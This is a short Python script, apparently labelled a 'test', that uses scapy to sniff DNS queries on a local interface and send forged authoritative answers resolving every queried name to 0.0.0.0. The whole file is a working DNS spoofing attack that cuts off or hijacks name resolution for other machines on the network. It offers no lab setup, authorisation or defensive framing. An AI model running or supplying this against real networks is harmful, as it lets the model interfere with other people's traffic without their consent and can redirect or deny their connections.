from scapy.all import *
import threading

def refined_dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # Check if it's a DNS query
        # Create a spoofed DNS response with an invalid IP address
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='0.0.0.0'))
        send(spoofed_pkt, verbose=False)
        print(f"Sent spoofed DNS response to {pkt[IP].src}")

if __name__ == "__main__":
    iface = "Wi-Fi"  # Replace with the interface name
    print("Starting DNS Spoofing test...")
    sniff(filter="udp port 53", iface=iface, store=0, prn=refined_dns_spoof)
